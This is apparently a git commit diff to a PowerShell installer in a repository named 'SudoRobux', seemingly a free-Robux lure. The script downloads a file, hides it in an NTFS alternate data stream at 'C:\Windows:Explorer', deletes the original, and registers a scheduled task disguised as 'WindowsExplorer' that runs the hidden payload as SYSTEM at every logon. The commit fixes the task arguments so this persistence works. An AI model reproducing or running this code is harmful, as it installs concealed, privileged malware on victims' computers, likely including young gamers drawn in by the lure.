81fb6be27493a78b9542c255752e2c9336c6bf08
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-07-22 12:48:07 +0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -7,7 +7,7 @@ curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main
 Write-Host "Installing..." -ForegroundColor DarkCyan
 cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
 rm .\russianhuzz
-$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe /c wmic process call create C:\Windows:Explorer"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c wmic process call create C:\Windows:Explorer"
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 1000000
 Register-ScheduledTask -TaskName "WindowsExplorer" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" > $null 2>&1
